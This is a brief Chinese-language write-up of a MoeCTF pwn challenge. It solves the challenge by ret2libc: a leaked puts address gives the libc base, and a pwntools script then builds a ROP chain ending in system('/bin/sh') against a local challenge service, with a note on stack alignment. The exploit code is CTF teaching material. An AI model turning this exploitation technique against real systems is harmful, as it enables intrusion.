# moectf 这是什么？libc!

by Maple

***ret2libc***

直接泄露给我们了puts的地址，还有libc在附件里，直接用就行

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/moectf/prelibc/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

开启了NX和PIE，确实libc好做

```python
from pwn import *

context(os="linux", arch="amd64")

#io = process('./pwn')
io = remote('127.0.0.1',58265)
libc = ELF("./libc.so.6")

io.recvuntil(b"0x")
libc.address = int(io.recv(12), 16) - libc.sym["puts"]

payload = cyclic(9) + flat([
        libc.search(asm("pop rdi; ret;")).__next__() + 1, # 即 `ret`，用于栈指针对齐
        libc.search(asm("pop rdi; ret;")).__next__(),
        libc.search(b"/bin/sh\x00").__next__(),
        libc.sym["system"],
])
io.sendafter(b">", payload)

io.interactive()
```

*直接用的官方wp*

这里解释一点，`libc.search(asm("pop rdi; ret;")).__next__() + 1`这里，本身libc搜到了`pop rdi； ret;`的地址，就返回为首地址，也就是`pop rdi`处，再加1就到了ret处，通过ret操作补全一下没对齐的栈